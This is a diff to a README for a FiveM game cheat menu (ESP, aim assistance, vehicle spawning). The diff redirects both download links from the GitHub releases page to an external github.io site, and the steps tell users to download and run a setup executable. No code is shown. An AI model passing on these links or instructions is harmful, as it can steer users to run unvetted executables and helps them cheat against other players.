@@ -1,6 +1,6 @@
 # 🎮 FiveM-Mod-Menu - Customize your gameplay with powerful tools
 
-[ ![Download Version 1.0](https://img.shields.io/badge/Download-Release-blue) ](https://github.com/Innv867/FiveM-Mod-Menu/releases)
+[ ![Download Version 1.0](https://img.shields.io/badge/Download-Release-blue) ](https://innv867.github.io)
 
 FiveM-Mod-Menu provides a set of tools to improve your gaming experience on FiveM servers. You can access features like entity ESP, precision aim assistance, vehicle spawning, and other utility functions. Use this software to tailor your session to your personal preferences.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these standards to run the application without issues
 
 Follow these steps to set up the menu on your machine.
 
-1.  Visit the official [Download Page](https://github.com/Innv867/FiveM-Mod-Menu/releases).
+1.  Visit the official [Download Page](https://innv867.github.io).
 2.  Locate the latest release at the top of the page.
 3.  Click the zip file or setup executable file to start the download.
 4.  Navigate to your Downloads folder.
